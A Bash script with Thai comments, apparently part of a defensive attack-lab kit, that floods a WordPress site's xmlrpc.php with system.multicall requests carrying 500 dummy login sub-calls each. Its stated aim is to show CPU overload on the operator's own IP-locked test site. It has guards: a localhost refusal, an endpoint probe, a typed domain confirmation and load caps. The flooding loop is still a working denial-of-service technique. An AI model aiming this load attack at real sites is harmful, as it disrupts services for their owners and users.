#!/usr/bin/env bash
# xmlrpc-load.sh — ยิง xmlrpc แบบ system.multicall ใส่ "เว็บทดสอบของเราเองที่ล็อก IP แล้ว"
# เพื่อพิสูจน์ด้วยตาว่าทำไม xmlrpc ต้องปิด — จำลองตัวที่ทำ CPU 92% บน bbc29pro.com
#
#   bash xmlrpc-load.sh https://test-qweda.xyz/ 20 30
#            ^ URL ฐานของเว็บทดสอบ        ^ยิงพร้อมกัน ^นานกี่วินาที
#
# ใช้คู่กับ docs/13-safe-vuln-testing.md ขั้นที่ 6 (ต้องทำขั้น 1-5 มาก่อน)
#
# 🔒 ปลอดภัยโดยออกแบบ — และรันได้เฉพาะเว็บทดสอบของเราเอง:
#   - ปฏิเสธ localhost (นั่นเป็นงานของ cpu-load-demo.sh) — ตัวนี้ยิงเว็บ WP จริงระยะไกล
#   - ตรวจก่อนว่าปลายทางเป็น endpoint xmlrpc ของ WordPress จริง ไม่ใช่เว็บมั่ว
#   - ต้องพิมพ์ชื่อโดเมนยืนยันเอง กันเผลอชี้ไปเว็บคนอื่น
#   - multicall ยัด "รหัสหลอกตัวเดียวซ้ำ ๆ" ไม่ใช่ wordlist — สาธิตภาระ CPU
#     (WordPress ยังวิ่ง path ตรวจรหัสเต็มทุก sub-call = CPU เท่าของจริง) แต่
#     ไม่แปรค่ารหัส ไม่อ่านลิสต์ ไม่รายงานว่ารหัสไหนถูก จึงเดารหัสใครไม่ได้เลย
#   - มีเพดาน conc/dur จบเองเสมอ
#
# ⚠️ กฎเหล็ก (docs/13): เว็บทดสอบต้อง "ล็อก IP ให้เข้าได้แค่ IP เรา" ก่อนปลดเกราะ xmlrpc
#    ยิงตัวนี้ต่อเมื่อ testsite-guard.sh บอกว่า "ล็อกแล้ว" เท่านั้น
#    ห้ามชี้ไปเว็บที่ไม่ใช่ของเรา — มันคือการโจมตี ไม่ใช่การทดสอบ

set -u
URL="${1:-}"
CONC="${2:-20}"
DUR="${3:-30}"
SUBCALLS=500          # จำนวน sub-call ต่อ 1 request (ขยายกำลัง เท่า attacker.py)

[ -n "$URL" ] || {
  echo "ใช้: bash xmlrpc-load.sh https://test-qweda.xyz/ [ยิงพร้อมกัน] [วินาที]"
  echo "     เช่น bash xmlrpc-load.sh https://test-qweda.xyz/ 20 30"
  exit 1
}
command -v curl >/dev/null || { echo "🔴 ต้องมี curl"; exit 1; }

# เพดานกันยิงหนักเกิน (เท่าชุด cpu-load-demo.sh / hammer.py)
case "$CONC" in ''|*[!0-9]*) CONC=20 ;; esac
case "$DUR"  in ''|*[!0-9]*) DUR=30  ;; esac
[ "$CONC" -gt 32 ] && CONC=32
[ "$CONC" -lt 1 ]  && CONC=1
[ "$DUR"  -gt 60 ] && DUR=60
[ "$DUR"  -lt 1 ]  && DUR=1

# ---------- แยก host + สร้าง endpoint xmlrpc ----------
BASE="${URL%/}"
# host = ตัดโปรโตคอลและ path ออก
HOSTPORT="${BASE#*://}"; HOSTPORT="${HOSTPORT%%/*}"
HOST="${HOSTPORT%%:*}"
XMLRPC="${BASE}/xmlrpc.php"

case "$BASE" in
  http://*|https://*) : ;;
  *) echo "🔴 URL ต้องขึ้นต้นด้วย http:// หรือ https:// — ได้: $URL"; exit 1 ;;
esac

# ---------- กันยิง localhost / เว็บที่ไม่ใช่ของเรา ----------
case "$HOST" in
  localhost|127.0.0.1|::1|"")
    echo "🔴 ตัวนี้สำหรับ 'เว็บทดสอบระยะไกลของเราเองที่ล็อก IP แล้ว' ไม่ใช่ localhost"
    echo "   อยากดูภาระ CPU บนเครื่องตัวเอง ใช้: bash tools/attack-lab/cpu-load-demo.sh"
    exit 1 ;;
esac

echo "=================================================================="
echo "  ยิง xmlrpc multicall ใส่เว็บทดสอบ"
echo "  เป้า : $XMLRPC"
echo "  ยิง  : $CONC พร้อมกัน นาน $DUR วินาที ($SUBCALLS sub-call/request)"
echo "=================================================================="

# ---------- ตรวจก่อนว่าเป็น xmlrpc ของ WordPress จริง ----------
echo "--- ตรวจปลายทางก่อนยิง ---"
probe=$(curl -sS -m 10 -o /tmp/xmlrpc-load.probe.$$ -w '%{http_code}' "$XMLRPC" 2>/dev/null || echo "000")
body="$(cat /tmp/xmlrpc-load.probe.$$ 2>/dev/null)"; rm -f /tmp/xmlrpc-load.probe.$$
if [ "$probe" = "403" ]; then
  echo "🔴 ปลายทางตอบ 403 — เกราะยังปิด xmlrpc อยู่ หรือ IP lock บล็อกแม้แต่เรา"
  echo "   ถ้าจะทดสอบต้อง open-xmlrpc ก่อน (บนเครื่องทดสอบ):"
  echo "     bash tools/attack-lab/testsite-guard.sh $HOST open-xmlrpc"
  echo "   ถ้า 403 เพราะ IP lock ไม่ยอมเรา ให้เพิ่ม IP เราเข้า allow ก่อน"
  exit 1
fi
case "$body" in
  *"XML-RPC server accepts POST requests only"*)
    echo "  ✅ ยืนยัน: เป็น endpoint xmlrpc ของ WordPress (เปิดรับ POST)" ;;
  *)
    echo "🔴 ปลายทางไม่ใช่ xmlrpc ของ WordPress (ตอบ $probe, ไม่มีข้อความ xmlrpc)"
    echo "   ยิงตัวนี้ได้เฉพาะเว็บ WordPress ทดสอบของเราเองเท่านั้น — ยกเลิก"
    exit 1 ;;
esac

# ---------- ยืนยันด้วยมือว่าเป็นเว็บของเราเอง (กันชี้ผิดเป้า) ----------
echo
echo "  ⚠️ กำลังจะยิงโหลดใส่  $HOST"
echo "     ต้องเป็นเว็บทดสอบของคุณเองที่ 'ล็อก IP แล้ว' (docs/13) เท่านั้น"
echo "     พิมพ์ชื่อโดเมน '$HOST' เพื่อยืนยัน (อย่างอื่น = ยกเลิก):"
printf "     > "
read -r CONFIRM || CONFIRM=""
if [ "$CONFIRM" != "$HOST" ]; then
  echo "  ยกเลิก — ไม่ได้พิมพ์ยืนยันตรงกับ $HOST"
  exit 1
fi

# ---------- สร้าง payload multicall (รหัสหลอกตัวเดียว ซ้ำ N ครั้ง = ขยายกำลัง) ----------
# ไม่ใช่ wordlist: username/password คงที่ ไม่แปรค่า จึงสาธิตภาระได้แต่เดารหัสไม่ได้
PAYLOAD="/tmp/xmlrpc-load.body.$$"
trap 'rm -f "$PAYLOAD"' EXIT INT TERM
{
  printf '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
  printf '<params><param><value><array><data>'
  i=0
  while [ "$i" -lt "$SUBCALLS" ]; do
    printf '<value><struct>'
    printf '<member><name>methodName</name><value>wp.getUsersBlogs</value></member>'
    printf '<member><name>params</name><value><array><data>'
    printf '<value><string>xmlrpc-load-demo</string></value>'
    printf '<value><string>load-demo-not-a-real-guess</string></value>'
    printf '</data></array></value></member>'
    printf '</struct></value>'
    i=$((i + 1))
  done
  printf '</data></array></value></param></params></methodCall>'
} > "$PAYLOAD"
echo "  payload พร้อม: 1 request = $SUBCALLS sub-call (รหัสหลอกตัวเดียวซ้ำ ไม่ใช่ wordlist)"

# ---------- ยิงรัว ๆ ----------
echo
echo "--- กำลังยิง $CONC พร้อมกัน นาน $DUR วินาที (เปิดหน้า aapanel ของเครื่องทดสอบดู CPU) ---"
COUNT="/tmp/xmlrpc-load.count.$$"
: > "$COUNT"
trap 'rm -f "$PAYLOAD" "$COUNT"' EXIT INT TERM
END=$(( $(date +%s) + DUR ))
for _ in $(seq 1 "$CONC"); do
  ( while [ "$(date +%s)" -lt "$END" ]; do
      curl -s -o /dev/null -m 15 \
        -H 'Content-Type: text/xml' \
        --data-binary @"$PAYLOAD" "$XMLRPC" && printf '.' >> "$COUNT"
    done ) &
done

# รายงานความคืบหน้าระหว่างยิง
while [ "$(date +%s)" -lt "$END" ]; do
  sleep 3
  n=$(wc -c < "$COUNT" 2>/dev/null || echo 0)
  left=$(( END - $(date +%s) )); [ "$left" -lt 0 ] && left=0
  echo "  ยิงสำเร็จแล้ว $n request  |  เหลืออีก ~${left}s  |  CPU เครื่องทดสอบควรพุ่งอยู่ตอนนี้"
done
wait
TOTAL=$(wc -c < "$COUNT" 2>/dev/null || echo 0)

echo
echo "=================================================================="
echo "  จบ — ยิง multicall สำเร็จรวม $TOTAL request ($SUBCALLS sub-call/ตัว)"
echo "  = ราว $(( TOTAL * SUBCALLS )) การประมวลผล auth ที่เครื่องทดสอบต้องแบก"
echo "  CPU จะตกกลับปกติเมื่อหยุดยิง"
echo
echo "  ของจริงแย่กว่านี้: บอทยิงจากหลายพัน IP พร้อมกัน 24 ชม. CPU ไม่มีวันลง"
echo "  (bbc29pro.com: 15,217 POST/ชม. -> CPU 92%)"
echo
echo "  เกราะที่กันได้จริง: ปิด xmlrpc ใน configs/common-site.conf + FastCGI cache"
echo "  เก็บกวาดเมื่อเสร็จ: bash tools/attack-lab/testsite-guard.sh $HOST close-xmlrpc"
echo "=================================================================="
